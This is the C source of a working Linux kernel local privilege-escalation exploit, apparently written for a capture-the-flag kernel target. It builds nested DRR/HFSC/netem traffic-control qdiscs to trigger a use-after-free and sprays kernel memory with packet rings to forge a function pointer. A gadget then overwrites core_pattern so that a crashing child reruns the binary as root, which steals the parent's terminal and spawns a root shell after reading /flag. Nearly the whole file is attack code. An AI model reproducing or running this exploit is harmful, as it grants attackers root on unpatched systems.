#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <net/if.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <syscall.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <linux/membarrier.h>
#include <linux/limits.h>
#include <linux/filter.h>

#include "netlink.h"

#include "rip.h"

typedef u_int8_t u8;
typedef u_int16_t u16;
typedef u_int32_t u32;
typedef u_int64_t u64;
typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define LEN(x) (sizeof(x) / sizeof(x[0]))
#define ASSERT(x) ({ if (!(x)) { err(EXIT_FAILURE, #x); } })
#define SYSCHK(x) ({ typeof(x) __tmp = (x); if (__tmp == (typeof(x))-1) { err(EXIT_FAILURE, #x); } __tmp; })

static void pin_to_cpu(int id) {
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(id, &set);
	ASSERT(sched_setaffinity(getpid(), sizeof(set), &set) != -1);
}

static void synchronize_rcu() {
	// A synchronize_rcu primitive in userspace: Original idea from https://github.com/lrh2000/StackRot
	if (syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1) < 0) {
		perror("membarrier()");
	}
}

static void set_rlimit_nofile() {
	struct rlimit lim = {};
	ASSERT(!prlimit(0, RLIMIT_NOFILE, NULL, &lim));
	lim.rlim_cur = lim.rlim_max;
	ASSERT(!prlimit(0, RLIMIT_NOFILE, &lim, NULL));
}

#define NETLINK_SEND_CHECK(fd, nlh, max_size) do {\
		ASSERT(!netlink_send(fd, nlh)); \
		ASSERT(netlink_recv(fd, nlh, max_size) > 0); \
		ASSERT(!netlink_errno(nlh)); \
	} while(0);


#if CI
// Generated with
// drr_dequeue+56: 0xffffffff81f5ca68+5
// &core_name_size: 0xffffffff83bbb2a0 
// On the CI, the speculation barrier call stubs are used, so need to adjust 
// the return address (compile with X86_FEATURE_RETHUNK) ..
// ./rip -t 0xffffffff83bbb2a0 -r 0xffffffff81f5ca6d -m 0 -p 0x1400 > filters.rip.ci.inc
#include "filters.rip.ci.inc"
#else
// Generated with
// drr_dequeue+56: 0xffffffff81f5ca68+2
// &core_name_size: 0xffffffff83bbb2a0 
// ./rip -t 0xffffffff83bbb2a0 -r 0xffffffff81f5ca6a -m 0 -p 0x1400 > filters.rip.inc
#include "filters.rip.inc"
#endif

static void prepare_payload_on_this_cpu() {
	// Kernel memory layout is a little bit unfortunate, thus we will overwrite
	// core_name_size as well.
	struct {
		int core_name_size;
		u8 __pad[32 - 4];
		char core_pattern[14];
	} __attribute__((packed)) payload = {
		.core_name_size = 128,
		.core_pattern = {"|/proc/%P/exe"},
	};
	write_payload((void*)&payload, sizeof(payload)); //  do it late just in case
}

static void ip_link_set_flags(int s, int ifindex, unsigned int ifi_flags) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;

	struct ifinfomsg* data = NLMSG_DATA(nlh);
	nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
	nlh->nlmsg_type = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = 0;
	nlh->nlmsg_pid = 0;

	data->ifi_family = PF_UNSPEC;
	data->ifi_type = 0;
	data->ifi_index = ifindex;
	data->ifi_flags = ifi_flags;
	data->ifi_change = 1;

	NETLINK_SEND_CHECK(s, nlh, sizeof(buf));
}

static void __setup_newqdisc_msg(struct nlmsghdr* nlh, unsigned if_index, unsigned parent, unsigned handle, const char* name) {
	struct tcmsg* data = NLMSG_DATA(nlh);
	nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
	nlh->nlmsg_type = RTM_NEWQDISC;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;
	nlh->nlmsg_seq = 0;
	nlh->nlmsg_pid = 0;

	data->tcm_family = PF_UNSPEC;
	data->tcm_ifindex = if_index;
	data->tcm_parent = parent;
	data->tcm_handle = handle & 0xFFFF0000;

	netlink_attr_put(nlh, TCA_KIND, name, strlen(name));
}

static void __setup_newclass_msg(struct nlmsghdr* nlh, unsigned if_index, unsigned parent, unsigned handle, bool create) {
	struct tcmsg* data = NLMSG_DATA(nlh);
	nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
	nlh->nlmsg_type = RTM_NEWTCLASS;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = 0;
	nlh->nlmsg_pid = 0;

	if (create)
		nlh->nlmsg_flags |= NLM_F_CREATE;

	data->tcm_family = PF_UNSPEC;
	data->tcm_ifindex = if_index;
	data->tcm_parent = parent;
	data->tcm_handle = parent | (handle & 0xFFFF);
}

static void change_drr_class(int fd, unsigned int if_index, unsigned int parent, unsigned int handle, bool create, u32 quantum) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	__setup_newclass_msg(nlh, if_index, parent, handle, create);

	struct nlattr* n = netlink_nest_begin(nlh, TCA_OPTIONS);
	netlink_attr_append(n, TCA_DRR_QUANTUM, &quantum, sizeof(quantum));
	netlink_nest_end(nlh, n);

	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}

static void change_hfsc_class(int fd, unsigned int if_index, unsigned int parent, unsigned int handle, bool create, const struct tc_service_curve* rsc) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	__setup_newclass_msg(nlh, if_index, parent, handle, create);

	struct nlattr* n = netlink_nest_begin(nlh, TCA_OPTIONS);
	netlink_attr_append(n, TCA_HFSC_RSC, rsc, sizeof(*rsc));
	netlink_nest_end(nlh, n);

	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}

static void delete_class(int fd, unsigned int if_index, unsigned int parent, unsigned int handle) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;

	struct tcmsg* data = NLMSG_DATA(nlh);
	nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
	nlh->nlmsg_type = RTM_DELTCLASS;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = 0;
	nlh->nlmsg_pid = 0;

	data->tcm_family = PF_UNSPEC;
	data->tcm_ifindex = if_index;
	data->tcm_parent = parent;
	data->tcm_handle = parent | (handle & 0xFFFF);

	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}


static void create_qdisc_drr(int fd, unsigned int if_index, unsigned int parent, unsigned int handle, const struct tc_sizespec* stab, const u16* stab_data) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	__setup_newqdisc_msg(nlh, if_index, parent, handle, "drr");

	if (stab) {
		struct nlattr* n = netlink_nest_begin(nlh, TCA_STAB);

		netlink_attr_append(n, TCA_STAB_BASE, stab, sizeof(*stab));
		netlink_attr_append(n, TCA_STAB_DATA, stab_data, stab->tsize * sizeof(u16));

		netlink_nest_end(nlh, n);
	}

	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}

static void create_qdisc_hfsc(int fd, unsigned if_index, unsigned int parent, unsigned int handle, struct tc_hfsc_qopt* opt) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	__setup_newqdisc_msg(nlh, if_index, parent, handle, "hfsc");
	netlink_attr_put(nlh, TCA_OPTIONS, opt, sizeof(*opt));
	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}

static void create_qdisc_netem(int fd, unsigned if_index, unsigned int parent, unsigned int handle, struct tc_netem_qopt* opt) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	__setup_newqdisc_msg(nlh, if_index, parent, handle, "netem");
	netlink_attr_put(nlh, TCA_OPTIONS, opt, sizeof(*opt));
	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}

static void create_qdisc_blackhole(int fd, unsigned if_index, unsigned int parent, unsigned int handle) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	__setup_newqdisc_msg(nlh, if_index, parent, handle, "blackhole");
	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}

static void create_qdisc_plug(int fd, unsigned if_index, unsigned int parent, unsigned int handle, struct tc_plug_qopt* opt) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	__setup_newqdisc_msg(nlh, if_index, parent, handle, "plug");
	netlink_attr_put(nlh, TCA_OPTIONS, opt, sizeof(*opt));
	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}

static void change_qdisc_plug(int fd, unsigned if_index, unsigned int parent, unsigned int handle, struct tc_plug_qopt* opt) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	__setup_newqdisc_msg(nlh, if_index, parent, handle, "plug");

	nlh->nlmsg_flags &= ~NLM_F_CREATE;

	netlink_attr_put(nlh, TCA_OPTIONS, opt, sizeof(*opt));
	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}

static void create_basic_filter(int fd, int if_index, unsigned int parent, unsigned int class_id) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	struct tcmsg* data = NLMSG_DATA(nlh);
	nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
	nlh->nlmsg_type = RTM_NEWTFILTER;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;
	nlh->nlmsg_seq = 0;
	nlh->nlmsg_pid = 0;

	data->tcm_family = PF_UNSPEC;
	data->tcm_ifindex = if_index;
	data->tcm_parent = parent;
	data->tcm_handle = 0;
	data->tcm_info = 0x10008 /*prio | protocol*/;

	netlink_attr_put(nlh, TCA_KIND, "basic", strlen("basic"));

	struct nlattr* n = netlink_nest_begin(nlh, TCA_OPTIONS);
	netlink_attr_append(n, TCA_BASIC_CLASSID, &class_id, sizeof(class_id));
	netlink_nest_end(nlh, n);

	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}

static void delete_basic_filter(int fd, int if_index, unsigned int parent, unsigned int class_id) {
	u8 buf[1024] = {0};
	struct nlmsghdr* nlh = (void*)buf;
	struct tcmsg* data = NLMSG_DATA(nlh);
	nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
	nlh->nlmsg_type = RTM_DELTFILTER;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = 0;
	nlh->nlmsg_pid = 0;

	data->tcm_family = PF_UNSPEC;
	data->tcm_ifindex = if_index;
	data->tcm_parent = parent;
	data->tcm_handle = 0;
	data->tcm_info = 0x10008 /*prio | protocol*/;

	netlink_attr_put(nlh, TCA_KIND, "basic", strlen("basic"));

	struct nlattr* n = netlink_nest_begin(nlh, TCA_OPTIONS);
	netlink_attr_append(n, TCA_BASIC_CLASSID, &class_id, sizeof(class_id));
	netlink_nest_end(nlh, n);

	NETLINK_SEND_CHECK(fd, nlh, sizeof(buf));
}


static int alloc_pages_via_sock(u32 pages_per_block, u32 num_blocks) {
	struct tpacket_req req;
	int fd, version;

	fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
	if (fd < 0)
		return fd;

	version = TPACKET_V1;

	if (setsockopt(fd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
		goto err;

	memset(&req, 0, sizeof(req));

	req.tp_block_size = pages_per_block * 0x1000;
	req.tp_block_nr = num_blocks;
	req.tp_frame_size = 4096;
	req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

	/*
	Target is af_packet.c:packet_set_ring() -> alloc_pg_vec() where
	    block_nr := num_blocks
	    and
	    order := pages_per_block - 1

	This allocates a kernel memory region filled with pointers to data we
	control of size 8*num_blocks in GFP_KERNEL.

	This is very helpful to fake the qdisc->ops->peek indirection
	*/

	if (setsockopt(fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
		goto err;

	return fd;

err:
	close(fd);
	return -1;
}

static void wait_for_core_pattern(int pipefd) {
	char buf[128] = {};

	pin_to_cpu(0);
	prepare_payload_on_this_cpu();
	ASSERT(read(pipefd, buf, 1) == 1);

	// this is a little risky because the core sysctl is partially corrupted.
	// works fine practically though.
	while (1) {
		int core = SYSCHK(open("/proc/sys/kernel/core_pattern", O_RDONLY));
		read(core, buf, sizeof(buf) - 1);
		close(core);

		if (strncmp(buf, "|/proc/%P/exe", 13) == 0) {
			asm volatile ("xor %rax, %rax; movq $0, (%rax);");
		}

		usleep(10 * 1000);
	}

	exit(0);
}

int main(int argc, char* argv[]) {
	const unsigned int lo = if_nametoindex("lo");
	const unsigned int qdisc_root = 1 << 16;

	const unsigned int class_drr = 1;
	const unsigned int qdisc_drr = 11 << 16;

	const unsigned int class_plug = 2;
	const unsigned int qdisc_plug = 12 << 16;

	const unsigned int class_hfsc = 11;
	const unsigned int qdisc_hfsc = 111 << 16;

	const unsigned int class_netem = 111;
	const unsigned int qdisc_netem = 1111 << 16;

	const unsigned int qdisc_blackhole = 11111 << 16;

	const unsigned int class_dummy = 1000;

	int nfd;

	if (!getuid()) {
		pid_t pid;
		sscanf(argv[0], "/proc/%u/exe", &pid);

		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd,0);
		dup2(stdoutfd,1);
		dup2(stderrfd,2);

		char* shell[] = {
			"/bin/sh",
			"-c",
#if CI
			// Avoid deadlocks on the CI :/
			"/bin/cat /flag && sleep 1 && echo c > /proc/sysrq-trigger",
#else
			"/bin/cat /flag && /bin/sh",
#endif
			NULL,
		};
		execve(shell[0], shell, NULL);
		return 0;
	}

	printf("Hello World!\n");

	int pipefds[2];
	ASSERT(!pipe(pipefds));

	pid_t pid = SYSCHK(fork());
	if (!pid) {
		close(pipefds[1]);
		wait_for_core_pattern(pipefds[0]);
	}

	close(pipefds[0]);

	set_rlimit_nofile();

	ASSERT(!unshare(CLONE_NEWUSER | CLONE_NEWNET));

	// on nokaslr runs, gadget needs to be adjusted for missing offset.
	if (argc > 1 && !strcmp(argv[1], "DEBUG")) {
		gadget -= 0x1000;
	}

	// do this first to avoid noise later
	int filters = SYSCHK(gadget_do_spray());
	printf("sprayed %d filters. gadget = 0x%lx\n", filters, gadget);

	nfd = SYSCHK(netlink_open(NETLINK_ROUTE));
	ip_link_set_flags(nfd, lo, IFF_UP);

	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port = 0,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	unsigned len = sizeof(addr);
	int s = SYSCHK(socket(AF_INET, SOCK_DGRAM, 0));

	ASSERT(!bind(s, (struct sockaddr*)&addr, len));
	ASSERT(!getsockname(s, (struct sockaddr*)&addr, &len));

	int c = SYSCHK(socket(AF_INET, SOCK_DGRAM, 0));

	u32 priority = 0;
	u8 buf[1] = {};
	#define SEND_PACKET_TO(qdisc) do {\
			if (priority != (qdisc)) { \
				priority = (qdisc); \
				ASSERT(!setsockopt(c, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority))); \
			} \
			ASSERT(sendto(c, buf, 1, 0, (struct sockaddr*)&addr, sizeof(addr)) > 0); \
		} while (0)

	// Need to prepare heap layout on known cores
	pin_to_cpu(0);

	printf("create qdisc root (drr) ..\n");
	create_qdisc_drr(nfd, lo, TC_H_ROOT, qdisc_root, NULL, NULL);

	// Create class to trigger use-after-free on. We want this to stay untouched.
	change_drr_class(nfd, lo, qdisc_root, class_drr, true, 1111);
	// To additionally protect the class, we make sure that the drr class does not belong
	// to the active slab anymore
	// (32 objs per slab for kmalloc-128 where struct drr_class resides)
	for (int i = 0; i < 32; i++) {
		change_drr_class(nfd, lo, qdisc_root, class_dummy + 1 + i, true, 1234);
	}

	// Why DRR as a child here? Because the heap spray is much easier in the
	// kmalloc-512 slab where DRR qdisc is allocated than the HFSC we need for
	// the vulnerability.
	// Since this is heap spray target, allocate on dedicated core
	pin_to_cpu(1);
	create_qdisc_drr(nfd, lo, qdisc_root | class_drr, qdisc_drr, NULL, NULL);
	pin_to_cpu(0);

	// need plug qdisc for dequeue / enqueue schedule control. Choose low quantum
	// so that plug re-schedules during dequeue when we release a packet.
	change_drr_class(nfd, lo, qdisc_root, class_plug, true, 1);
	struct tc_plug_qopt plug_opt = {
		.limit = 0xffff // in bytes
	};
	create_qdisc_plug(nfd, lo, qdisc_root | class_plug, qdisc_plug, &plug_opt);

	// Qdisc tree introducing the vulnerability
	change_drr_class(nfd, lo, qdisc_drr, class_hfsc, true, 1111);
	struct tc_hfsc_qopt hfsc_opt = {
		.defcls = class_netem,
	};
	create_qdisc_hfsc(nfd, lo, qdisc_drr | class_hfsc, qdisc_hfsc, &hfsc_opt);

	// Because of nesting, we need to provide filter on child so that packets
	// default into the hfsc class (which is the only one)
	create_basic_filter(nfd, lo, qdisc_drr, qdisc_drr | class_hfsc);

	// In order to trigger the bug, we need the rsc curve
	struct tc_service_curve rsc = {
		.m1 = 1, /* m1 or m2 needs to be non-zero to be valid */
	};
	change_hfsc_class(nfd, lo, qdisc_hfsc, class_netem, true, &rsc);

	struct tc_netem_qopt netem_opt = {
		.limit = 1, /* need at least one packet */
	};
	create_qdisc_netem(nfd, lo, qdisc_hfsc | class_netem, qdisc_netem, &netem_opt);
	create_qdisc_blackhole(nfd, lo, qdisc_netem | 1, qdisc_blackhole);

	// Activate plug to halt dequeue operations
	SEND_PACKET_TO(qdisc_root | class_plug);

	// Okay. Now one packet into hfsc. This packet is dropped straight away because
	// of blackhole.
	// Still, because of bugs, the drr class is activated.
	SEND_PACKET_TO(qdisc_root | class_drr);


	// Thus, delete the drr class to create use-after-free
	delete_basic_filter(nfd, lo, qdisc_drr, qdisc_drr | class_hfsc);
	delete_class(nfd, lo, qdisc_root, class_drr);
	synchronize_rcu();

	// class and nested hfsc qdisc and its children are free now.
	// try to reclaim the nested drr _qdisc_ but not its parent class (which is also
	// a drr class)
	// struct Qdisc (size = 384) with struct drr_sched (56) resides in kmalloc-512, GFP_KERNEL
	// need to overwrite qdisc->ops->peek per drr dequeue operation

	// just enough to go into kmalloc-512
	#define N_BLOCKS ((256 + 8) / 8)

	pin_to_cpu(1);
	for (int i = 0; i < 4*16; i++) {
		int s = SYSCHK(alloc_pages_via_sock(1, N_BLOCKS));
		void* base = SYSCHK(mmap(NULL, 1 * N_BLOCKS * 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, s, 0));

		for (int i = 0; i < N_BLOCKS; i++) {
			// struct Qdisc_ops, we only care about the peek member
			struct {
				u64 _pad[7];
				u64 peek; // struct sk_buff *  (*peek)(struct Qdisc *);
			}* ops = base + i * 0x1000;

			ops->peek = gadget;
		}

		munmap(base, 1 * N_BLOCKS * 0x1000);
	}

	// trigger

	// start watcher
	ASSERT(write(pipefds[1], "", 1) == 1);

	prepare_payload_on_this_cpu();

	plug_opt.action = TCQ_PLUG_RELEASE_INDEFINITE;
	change_qdisc_plug(nfd, lo, qdisc_root | class_plug, qdisc_plug, &plug_opt);

	/* weird. we should not return here. */
	pin_to_cpu(0);
	while (1) { sleep(100); }
}
